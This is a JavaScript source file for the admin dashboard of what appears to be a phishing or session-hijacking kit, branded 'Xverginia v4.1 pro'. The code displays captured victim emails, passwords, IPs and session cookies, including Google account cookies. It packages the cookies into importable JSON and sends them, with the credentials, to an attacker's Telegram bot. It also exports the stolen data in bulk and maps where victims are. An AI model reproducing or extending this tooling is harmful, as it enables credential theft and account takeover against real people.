document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("settingsToggle").addEventListener("click", () => {
    document.getElementById("settingsOverlay").classList.remove("hidden");
    fetch("/get-telegram")
      .then(response => response.json())
      .then(data => {
        document.getElementById("chatId").value = data.chatId || "";
        document.getElementById("botToken").value = data.botToken || "";
      })
      .catch(error => {
        console.error("Failed to load settings:", error);
        showNotify("❌ Could not load saved Telegram settings.", "error");
      });
  });

  document.getElementById("settingsOverlay").addEventListener("click", event => {
    const overlayContent = document.querySelector(".overlay-content");
    if (!overlayContent.contains(event.target)) {
      document.getElementById("settingsOverlay").classList.add("hidden");
    }
  });

  document.querySelectorAll(".toggle-password").forEach(button => {
    button.addEventListener("click", () => {
      const cell = button.closest("td");
      const maskedPassword = cell.querySelector(".masked-password");
      const realPassword = cell.querySelector(".real-password");

      maskedPassword.classList.toggle("hidden");
      realPassword.classList.toggle("hidden");

      button.textContent = realPassword.classList.contains("hidden") ? "👁️" : "🙈";
    });
  });
});

async function sendToTelegram(sessionData) {
  const getValueOrDefault = (value, defaultText = "❌ No Data") =>
    value !== undefined && value !== null && value !== "" ? value : defaultText;

  let password = "";
  if (typeof sessionData.password === "string") {
    password = sessionData.password;
  } else if (sessionData.password && typeof sessionData.password === "object") {
    password = sessionData.password.password || Object.values(sessionData.password)[0] || "";
    if (typeof password === "object") {
      password = "";
    }
  }

  const browserInfo = getValueOrDefault(sessionData.useragent || sessionData.browser || "");
  const ipAddress = getValueOrDefault(sessionData.remote_addr || sessionData.ip || "");

  let timestamp = "";
  if (sessionData.create_time) {
    if (typeof sessionData.create_time === "number") {
      timestamp = new Date(sessionData.create_time * 1000).toLocaleString();
    } else {
      timestamp = getValueOrDefault(sessionData.create_time);
    }
  } else {
    timestamp = new Date().toLocaleString();
  }

  const emailOrUsername = getValueOrDefault(sessionData.username || sessionData.email || "❌ No Email");

  let customDataDisplay = "❌ No Custom Data";
  if (sessionData.custom && Object.keys(sessionData.custom).length > 0) {
    try {
      customDataDisplay = JSON.stringify(sessionData.custom, null, 2);
    } catch (e) {
      customDataDisplay = String(sessionData.custom);
    }
  }

  const message = `╔⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯﴾ ID: ${getValueOrDefault(sessionData.id, "unknown")} ﴿⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯
╠ 🗂️ 𝙑𝙖𝙡𝙞𝙙 𝘾𝙤𝙤𝙠𝙞𝙚𝙨 𝙇𝙤𝙜
╠ 📨 Εⅿаіl: ${emailOrUsername}
╠ 🔐 Ꮲаѕѕԝоrd: ${password ? password : "❌ No Password"}
╠══════════﴾ Location & IP Info ﴿══════════
╠ 🌐 Browser: ${browserInfo}
╠ 🧭 IP: ${ipAddress}
╠ ⏰ Time: ${timestamp}
╠ 🛠 Custom Data:
\`\`\`
${customDataDisplay}
\`\`\`
╚⋯⋯⋯⋯⋯⋯⋯﴾ 乂𝓋ℯ𝓇ℊ𝒾𝓃𝒾𝒶 𝓋4.1 𝓅𝓇ℴ ﴿⋯⋯⋯⋯⋯⋯⋯`;

  try {
    await fetch("https://api.telegram.org/botPUT UR TELEGRAM TOKEN HERE/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "PUT UR CHATID HERE",
        text: message,
        parse_mode: "Markdown"
      })
    });

    sendCookiesToTelegram(sessionData.tokens, sessionData.id);
    showNotify("🍪 Cookies sent to Telegram!", "success");
  } catch (error) {
    console.error("Telegram Error:", error);
    showNotify("❌ Failed to send 🍪 Cookies to Telegram.", "error");
  }
}

async function sendCookiesToTelegram(tokens, sessionId) {
  let cookieArray = [];

  for (const domain in tokens) {
    for (const name in tokens[domain]) {
      let cookie = tokens[domain][name];
      cookieArray.push({
        path: cookie.Path || "/",
        domain: domain,
        expirationDate: cookie.ExpirationDate || 1773674937,
        value: cookie.Value || "",
        name: cookie.Name || name,
        httpOnly: cookie.HttpOnly || false,
        hostOnly: domain === "accounts.google.com" || cookie.Name.startsWith("__Host-"),
        secure: cookie.Name.startsWith("__Secure-"),
        session: cookie.Session || false
      });
    }
  }

  let blob = new Blob([JSON.stringify(cookieArray, null, 0)], { type: "application/json" });
  let formData = new FormData();
  formData.append("chat_id", "PUT UR CHATID HERE");
  formData.append("document", blob, "cookiesID " + sessionId + ".json");

  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://api.telegram.org/botPUT UR TELEGRAM TOKEN HERE/sendDocument", true);

  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log("Telegram File Sent:", xhr.responseText);
    } else {
      console.error("Error sending file:", xhr.status, xhr.statusText);
    }
  };

  xhr.onerror = function () {
    console.error("Request failed");
  };

  xhr.send(formData);
}

function copyToClipboard(text, element) {
  navigator.clipboard.writeText(text).then(() => {
    showNotify("📋 Copied to clipboard", "success");
  }).catch(err => {
    console.error("❌ Failed to copy:", err);
    showNotify("❌ Failed to copy data.", "error");
  });
}

function toggleTheme() {
  document.body.classList.toggle("dark-mode-toggle");
}

document.addEventListener("DOMContentLoaded", () => {
  const themeToggleBtn = document.getElementById("themeToggle");
  const themeIcon = document.getElementById("themeIcon");
  const savedTheme = localStorage.getItem("theme");

  if (savedTheme === "dark") {
    document.body.classList.add("dark");
    document.body.classList.remove("light");
    themeIcon.classList.remove("ri-moon-line");
    themeIcon.classList.add("ri-sun-line");
  } else {
    document.body.classList.add("light");
    document.body.classList.remove("dark");
    themeIcon.classList.remove("ri-sun-line");
    themeIcon.classList.add("ri-moon-line");
  }

  themeToggleBtn.addEventListener("click", () => {
    const isDark = document.body.classList.contains("dark");

    if (isDark) {
      document.body.classList.remove("dark");
      document.body.classList.add("light");
      themeIcon.classList.remove("ri-sun-line");
      themeIcon.classList.add("ri-moon-line");
      localStorage.setItem("theme", "light");
    } else {
      document.body.classList.remove("light");
      document.body.classList.add("dark");
      themeIcon.classList.remove("ri-moon-line");
      themeIcon.classList.add("ri-sun-line");
      localStorage.setItem("theme", "dark");
    }
  });
});

function updateDashboardStats() {
  fetch("/stats")
    .then(response => response.json())
    .then(stats => {
      const totalEl = document.querySelector(".dashboard-card p.percent-bull, .dashboard-card p.percent-bear");
      if (totalEl) {
        totalEl.textContent = stats.total;
        totalEl.className = "percent-" + stats.visitTrend;
      }

      const visitPercentEl = document.querySelector("small.percent-bull, small.percent-bear:nth-of-type(1)");
      if (visitPercentEl) {
        visitPercentEl.textContent = stats.visitPercent + "%";
        visitPercentEl.className = "percent-" + stats.visitTrend;
      }

      const validCountEl = document.querySelector(".dashboard-card p.valid");
      if (validCountEl) {
        validCountEl.textContent = stats.validCount;
      }

      const validTrendEl = validCountEl?.parentElement?.querySelector("small.percent-bull, small.percent-bear");
      if (validTrendEl) {
        validTrendEl.textContent = stats.validPercent + "%";
        validTrendEl.className = "percent-" + stats.validTrend;
      }

      const invalidCountEl = document.querySelector(".dashboard-card p.invalid");
      if (invalidCountEl) {
        invalidCountEl.textContent = stats.invalidCount;
      }

      const invalidTrendEl = invalidCountEl?.parentElement?.querySelector("small.percent-bull, small.percent-bear");
      if (invalidTrendEl) {
        invalidTrendEl.textContent = stats.invalidPercent + "%";
        invalidTrendEl.className = "percent-" + stats.invalidTrend;
      }
    })
    .catch(err => {
      console.error("❌ Failed to update dashboard stats:", err);
    });
}

initCopyButtons();
setInterval(updateDashboardStats, 1000);

function deleteAllSessions() {
  if (!confirm("⚠️ Are you sure you want to delete ALL sessions? This cannot be undone.")) {
    return;
  }

  fetch("/delete-all", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    }
  })
    .then(async response => {
      const result = await response.json();

      if (!response.ok) {
        showNotify(result.message || "❌ Failed to delete sessions.", "error");
        throw new Error(result.message);
      }

      showNotify(result.message || "✅ All sessions deleted.", "success");
      document.querySelectorAll("#dataTable tr:nth-child(n+2)").forEach(row => row.remove());
    })
    .catch(error => {
      console.error("❌ Error deleting sessions:", error);
      showNotify("❌ Network error. Please try again.", "error");
    });
}

function exportData(format) {
  const tableRows = document.querySelectorAll("#dataTable tr");
  const headers = Array.from(tableRows[0].querySelectorAll("th")).map(th => th.textContent.trim());

  let dataRows = [];

  for (let i = 1; i < tableRows.length; i++) {
    if (tableRows[i].style.display === "none") {
      continue;
    }

    const cells = tableRows[i].querySelectorAll("td");
    const rowData = {};

    for (let j = 0; j < cells.length - 1; j++) {
      rowData[headers[j]] = cells[j].innerText.trim();
    }

    dataRows.push(rowData);
  }

  if (format === "json") {
    const blob = new Blob([JSON.stringify(dataRows, null, 2)], {
      type: "application/json"
    });
    downloadBlob(blob, "sessions.json");
  } 
  else if (format === "csv") {
    const csvLines = [];
    csvLines.push(headers.slice(0, -1).join(","));

    for (const row of dataRows) {
      csvLines.push(
        headers.slice(0, -1)
          .map(header => `"${(row[header] || "").replace(/"/g, '""')}"`)
          .join(",")
      );
    }

    const blob = new Blob([csvLines.join("\n")], {
      type: "text/csv"
    });
    downloadBlob(blob, "sessions.csv");
  } 
  else if (format === "txt") {
    const textContent = dataRows
      .map(row =>
        Object.entries(row)
          .map(([key, value]) => `${key}: ${value}`)
          .join("\n")
      )
      .join("\n\n---\n\n");

    const blob = new Blob([textContent], {
      type: "text/plain"
    });
    downloadBlob(blob, "sessions.txt");
  }
}

function downloadBlob(blob, filename) {
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");

  link.href = url;
  link.download = filename;

  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  URL.revokeObjectURL(url);
}

function initCopyButtons() {
  document.querySelectorAll(".send-telegram").forEach(button => {
    button.addEventListener("click", () => {
      const row = button.closest("tr");

      const sessionData = {
        id: row.querySelector("td:nth-child(1)").innerText,
        username: row.querySelector("td:nth-child(2)").innerText,
        password: row.querySelector("td:nth-child(3)").innerText,
        useragent: row.querySelector("td:nth-child(5)").innerText,
        remote_addr: row.querySelector("td:nth-child(4)").innerText,
        create_time: row.querySelector("td:nth-child(6)").innerText,
        custom: JSON.parse(row.dataset.custom || "{}"),
        tokens: JSON.parse(row.dataset.tokens || "{}")
      };

      console.log("sessionData:", sessionData);
      sendToTelegram(sessionData);
    });
  });
}

function showNotify(message, type = "info", duration = 3000) {
  const notifyElement = document.getElementById("notify");

  notifyElement.className = "notify";

  if (type === "success") {
    notifyElement.classList.add("notify-success");
  } else if (type === "error") {
    notifyElement.classList.add("notify-error");
  } else {
    notifyElement.classList.add("notify-info");
  }

  notifyElement.textContent = message;
  notifyElement.classList.remove("hidden");
  notifyElement.classList.add("show");

  setTimeout(() => {
    notifyElement.classList.remove("show");
    notifyElement.classList.add("hidden");
  }, duration);
}

function saveTelegramSettings() {
  const chatId = document.getElementById("chatId").value.trim();
  const botToken = document.getElementById("botToken").value.trim();

  if (!chatId || !botToken) {
    showNotify("Both Chat ID and Bot Token are required.", "error");
    return;
  }

  fetch("/settings/save", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chatId: chatId,
      botToken: botToken
    })
  })
    .then(async response => {
      const result = await response.json();
      showNotify(result.message || "✅ Saved", response.ok ? "success" : "error");
    })
    .catch(error => {
      console.error(error);
      showNotify("❌ Failed to save Telegram settings.", "error");
    });
}

function savePasswordChange() {
  const oldPassword = document.getElementById("oldPassword").value.trim();
  const newPassword = document.getElementById("newPassword").value.trim();

  if (!oldPassword || !newPassword) {
    showNotify("Enter both old and new passwords.", "error");
    return;
  }

  fetch("/settings/change-password", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      oldPassword: oldPassword,
      newPassword: newPassword
    })
  })
    .then(async response => {
      const result = await response.json();
      showNotify(result.message || "Password updated", response.ok ? "success" : "error");
    })
    .catch(error => {
      console.error(error);
      showNotify("Failed to update password.", "error");
    });
}

function logoutUser() {
  if (!confirm("⚠️ Are you sure you want to logout?")) {
    return;
  }

  fetch("/logout", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    }
  })
    .then(response => {
      if (response.redirected) {
        window.location.href = response.url;
      } else {
        showNotify("✅ Logged out.", "success");
      }
    })
    .catch(error => {
      console.error("Logout failed:", error);
      showNotify("❌ Logout failed.", "error");
    });
}

let currentSort = {
  columnIndex: null,
  ascending: true
};

let map;
let heatLayer;
let markerCluster;
let visitorLocations = [];
let triggeredIPs = {};

const purpleIcon = L.icon({
  iconUrl: "img/alert.png",
  iconSize: [30, 30],
  iconAnchor: [15, 30],
  popupAnchor: [0, -30]
});

async function initMap() {
  map = L.map("map", {
    center: [20, 0],
    zoom: 2,
    zoomControl: true,
    attributionControl: false
  });

  // Create a pane for labels that stays above other layers
  map.createPane("labels");
  map.getPane("labels").style.zIndex = 650;
  map.getPane("labels").style.pointerEvents = "none";

  const dbIcon = L.icon({
    iconUrl: "img/db.png",
    iconSize: [20, 20],
    iconAnchor: [10, 20],
    popupAnchor: [0, -20]
  });

  let dbMarker;

  try {
    // Get public IP of the server
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipResponse.json();

    // Get geolocation of that IP
    const geoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,lat,lon`);
    const geoData = await geoResponse.json();

    let centerCoords = [20, 0]; // fallback
    if (geoData.status === "success") {
      centerCoords = [geoData.lat, geoData.lon];
    }

    dbMarker = L.marker(centerCoords, { icon: dbIcon }).addTo(map);
    dbMarker.bindPopup("DataBase");
    map.setView(centerCoords, 3);
  } catch (error) {
    console.error("Error obtaining Server IP:", error);

    // Fallback marker at default position
    dbMarker = L.marker([20, 0], { icon: dbIcon }).addTo(map);
    dbMarker.bindPopup("DataBase");
  }

  // Initial load of visitor data
  await loadVisitorMapData(dbMarker.getLatLng());

  // Refresh visitor data every 10 seconds
  setInterval(() => loadVisitorMapData(dbMarker.getLatLng()), 10000);
}

function getIPsFromTable() {
  const uniqueIPs = new Set();

  $("#dataTable tbody tr").each(function () {
    const ipCell = $(this).find("td").eq(3).text().trim(); // 4th column (index 3)
    if (ipCell && ipCell.length > 5) {
      uniqueIPs.add(ipCell);
    }
  });

  return Array.from(uniqueIPs);
}

async function loadVisitorMapData(dbMarkerLatLng) {
  const currentIPs = getIPsFromTable();
  const visitorData = [];

  // Reset global visitor locations
  visitorLocations = [];

  for (const ip of currentIPs) {
    try {
      const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,lat,lon,query`);
      const geo = await response.json();

      if (geo.status === "success") {
        const entry = {
          ip: geo.query,
          country: geo.country,
          lat: geo.lat,
          lng: geo.lon
        };

        visitorData.push(entry);
        visitorLocations.push([geo.lat, geo.lon]);

        // Trigger meteor animation only once every 2 minutes per IP
        const now = Date.now();
        if (!triggeredIPs[ip] || now - triggeredIPs[ip] > 120000) {
          simulateMeteor(dbMarkerLatLng, { lat: geo.lat, lng: geo.lon });
          triggeredIPs[ip] = now;
        }
      }
    } catch (err) {
      console.warn("Geo error:", err);
    }
  }

  updateMap(visitorData);
}

function updateMap(visitors) {
  // Remove old marker cluster if exists
  if (markerCluster) {
    map.removeLayer(markerCluster);
  }

  markerCluster = L.markerClusterGroup();

  const heatPoints = [];

  visitors.forEach(visitor => {
    const coords = [visitor.lat, visitor.lng];
    heatPoints.push(coords);

    const marker = L.marker(coords, { icon: purpleIcon });
    marker.bindPopup(`<b>${visitor.ip}</b><br>${visitor.country}`);
    markerCluster.addLayer(marker);
  });

  map.addLayer(markerCluster);

  // Remove and recreate heat layer
  if (heatLayer) {
    map.removeLayer(heatLayer);
  }

  heatLayer = L.heatLayer(heatPoints, {
    radius: 25,
    blur: 15,
    maxZoom: 10
  }).addTo(map);
}

function simulateMeteor(startLatLng, targetLatLng) {
  const start = L.latLng(startLatLng.lat, startLatLng.lng);
  const end = L.latLng(targetLatLng.lat, targetLatLng.lng);

  // Calculate midpoint + some height for parabolic curve
  const midLat = (start.lat + end.lat) / 2 + 10;
  const midLng = (start.lng + end.lng) / 2;

  let step = 0;
  let previousPoint = start;

  const mainTrailMarker = L.circleMarker(start, {
    radius: 5,
    color: "#ff9933",
    fillColor: "#ffcc66",
    fillOpacity: 1
  }).addTo(map);

  const trailLines = [];
  const sparks = [];

  const animationInterval = setInterval(() => {
    step++;

    const t = step / 100;

    // Quadratic Bezier curve for meteor-like arc
    const currentLat =
      (1 - t) ** 2 * start.lat +
      2 * (1 - t) * t * midLat +
      t ** 2 * end.lat;

    const currentLng =
      (1 - t) ** 2 * start.lng +
      2 * (1 - t) * t * midLng +
      t ** 2 * end.lng;

    const currentPos = L.latLng(currentLat, currentLng);

    mainTrailMarker.setLatLng(currentPos);

    // Draw trail segment
    const segment = L.polyline([previousPoint, currentPos], {
      color: "lime",
      weight: 1,
      opacity: 0.3
    }).addTo(map);
    trailLines.push(segment);

    previousPoint = currentPos;

    // Random spark effect
    const sparkLat = currentLat + (Math.random() - 0.5) * 0.03;
    const sparkLng = currentLng + (Math.random() - 0.5) * 0.03;
    const sparkRadius = Math.random() * 1.5 + 0.5;
    const sparkOpacity = Math.random() * 0.2 + 0.1;

    const spark = L.circleMarker([sparkLat, sparkLng], {
      radius: sparkRadius,
      color: "gold",
      fillColor: "yellow",
      fillOpacity: sparkOpacity,
      weight: 0
    }).addTo(map);

    sparks.push(spark);

    // Remove spark after short delay
    setTimeout(() => {
      map.removeLayer(spark);
    }, 500 + Math.random() * 400);

    // End animation after 100 steps
    if (step >= 100) {
      clearInterval(animationInterval);

      setTimeout(() => {
        map.removeLayer(mainTrailMarker);
        trailLines.forEach(line => map.removeLayer(line));
        sparks.forEach(spark => map.removeLayer(spark));
      }, 1000);
    }
  }, 20);
}

// Initialize map on load
initMap();

document.addEventListener("DOMContentLoaded", async () => {
  const configResponse = await fetch("/api/config");
  const config = await configResponse.json();
  const general = config.general;

  document.getElementById("domain").value = general.domain || "";
  document.getElementById("use_https").value = general.use_https ? "true" : "false";
  document.getElementById("unauth_url").value = general.unauth_url || "";
  document.getElementById("og_title").value = general.og_title || "";
  document.getElementById("og_desc").value = general.og_desc || "";
  document.getElementById("og_image").value = general.og_image || "";
  document.getElementById("chatId").value = general.telegram_chat_id || "";
  document.getElementById("botToken").value = general.telegram_bot_token || "";
});

async function saveConfig() {
  const updatedConfig = {
    domain: document.getElementById("domain").value,
    use_https: document.getElementById("use_https").value === "true",
    unauth_url: document.getElementById("unauth_url").value,
    og_title: document.getElementById("og_title").value,
    og_desc: document.getElementById("og_desc").value,
    og_image: document.getElementById("og_image").value,
    telegram_bot_token: document.getElementById("botToken").value,
    telegram_chat_id: document.getElementById("chatId").value
  };

  const response = await fetch("/api/config/update", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      general: updatedConfig
    })
  });

  const result = await response.json();
  alert(result.message || "✅ Configuration saved.");
}